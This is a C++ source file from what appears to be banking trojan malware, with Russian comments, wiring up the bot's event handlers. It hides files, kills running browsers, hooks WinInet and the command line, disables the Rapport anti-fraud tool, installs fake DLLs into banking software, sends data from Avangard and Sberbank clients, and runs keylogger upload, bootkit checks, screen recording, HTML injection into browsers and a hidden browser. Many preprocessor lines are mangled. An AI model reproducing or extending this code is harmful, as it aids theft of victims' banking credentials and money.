//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "Pipes.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "Modules.h"

//---------------------------------------------------------------------------





//-----------------------------------------------------------
//  InitializeHiddenFiles - Функция инициализирует массив
//                          файлов имена которых бот будет
//                          прятать
//-----------------------------------------------------------
void InitializeHiddenFiles()
{
	BOT::AddHiddenFile(GetStr(EStrConfigFileName));
	//BOT::AddHiddenFile(GetStr(EStrConfigHPFileName));
}

//---------------------------------------------------------------------------

//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);

void ExplorerFirstStart(PEventData Data)
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef antirapportH
		AntiRapport();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AvangardH
		AvangardWeb::SendFolder_avn_ib();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef SBERH
		Sber::SendLogIfReestr();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef IFobsH
		IFobs::KillIFobs(0);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef FakeDllInstallerH
		RunThread( IFobs::InstallFakeDll,0 );
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//ExecuteDocFind( 0, 0, 0 );
	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
//	ExecuteRunRDP( 0, 0, 0 );
//	ExecuteVNC( 0, 0, "192.168.0.100" );
	// Первый запуск бота в проводнике

	// Запускаем удаление кукисов
	/* //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef coocksolH
		StartDeleteCookiesThread();
    //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{

	// Создаём глобальный мьютекс, сигнализирующий о запущенном боте
	BOT::TryCreateBotInstance();


	// Инициализируем скрываемые файлы
    InitializeHiddenFiles();


	// Записываем текущие настроки в файл.
	// Запись осуществится только если записанных настроек нет
    BOT::SaveSettings(true, true, true);


	// Убиваем все запущенные браузеры
	KillAllBrowsers();

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef FakeDllInstallerH
    	FDI::Execute();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BBSCBankH
		CBank::Start();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef JAVS_PATCHERH
		StartThread(Run_Path, NULL);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// Хукаем библиотеку WinInet
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef InternetExplorerH
		HookInternetExplorer();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// Запускаем модуль живучести
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeepAliveH
		KeepAliveCheckProcess(PROCESS_SVCHOST);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoRecorderH
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoProcessSvchost
				KeepAliveCheckProcess(PROCESS_VIDEO);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if 
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


	// Проверяем систему киберплат
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef CyberPlatDLLH
		CyberPlatCheckInstalled(); 
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef CmdLineH
		HookCmdLine();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BitcoinH
		BitcoinRunAfterReboot();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoRecorderH
		VideoProcess::ConnectToServer( 0, true );
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// Запуск потока скрытого браузера.
	// ВАЖНО! Вызов должен вызываться в последнюю очередь
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// запускаем поток отвечающеий за запуск браузера
		pWaitForSingleObject(H, INFINITE);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// Запущена функция работающая в процессе svchost


	// запускаем автоматическую загрузку хостов
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HostsAutoUpdateH
		StartHostsUpdater();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef bootkitH
		IsBootkitInstaled();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeepAliveH
		// Инициализируем модуль живучести
		KeepAliveInitializeProcess(PROCESS_SVCHOST);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//Стартуем поток проверки появления данных для отправки кейлогером
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeyLoggerH	
		SendLoadedFiles();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		//Модуль охотник за сайтами , проверяет раз в 15 сек если создался мьютекс,то выполняет команду SB
		// Инициализируем клиента ожидания охотника за ссылками
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HunterH
		URLHunter::StartClient();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessLoader, true);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// Запущен Internet Explorer. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// Запущен АшкуАщч. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// Запущен известный браузер. Возникает после инжекта в процесс браузера
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HTMLSendH
		InitHTMLSendHandlers();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if;

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AzConfigH
		AzInizializeHTMLInjects();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// Запущено неизвестное приложение

}
//---------------------------------------------------------------------------

